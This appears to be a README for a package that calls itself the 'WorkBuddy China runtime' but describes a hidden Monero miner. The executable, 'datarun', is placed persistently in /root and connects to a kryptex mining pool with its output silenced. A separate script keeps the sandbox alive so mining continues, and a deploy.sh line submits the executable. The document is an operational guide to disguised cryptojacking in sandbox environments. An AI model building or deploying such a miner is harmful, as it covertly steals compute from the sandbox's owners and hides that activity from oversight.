# WorkBuddy China runtime — 2.3.4-cn-hk1

Linux amd64 compiled delivery: keep start, key, data and 1.key together.
Use the authorized console deployment, which supplies the package key and
verified Chinese Cookie context privately. This repository contains no account
credentials, package password, signing key or console source.

The launcher verifies the signed package, extracts a persistent datarun, and
the installer starts that executable with zero arguments. datarun connects
directly over TLS to xmr-hk.kryptex.network:8029 using the existing payout
account. It does not use the aggregation proxy or read WorkBuddy credentials.
It contains no native keepalive or guard handover code and never stops a
keepalive script. The independent console script owns sandbox keepalive,
including when download, extraction, mining, or the launcher exits.

The default installation uses /root/start, /root/key, /root/1.key,
/root/domestic.data and /root/datarun. Existing conflicting files are retained.
The executable remains after extraction and can be started directly with no
package inputs or credentials. Its --self-check option performs an offline
entry check without starting mining. Miner stdout/stderr goes to /dev/null.

The extraction keeps the existing international delivery's signed-template
verification and 54-character random instance data field. No executable code
is patched, and there is no per-instance registry. Local random identifiers
are not a guarantee of global uniqueness.

deploy.sh OUTPUT_DIRECTORY PACKAGE_KEY_FILE RUNTIME_CREDENTIAL_FILE [PROGRAM_NAME]
downloads the fixed reviewed delivery from this repository, verifies every
file, extracts it, and submits the executable. It does not manage or stop
keepalive. Deployment submission is distinct from accepted mining shares or
long-term sandbox retention. See release.json for file and template hashes.
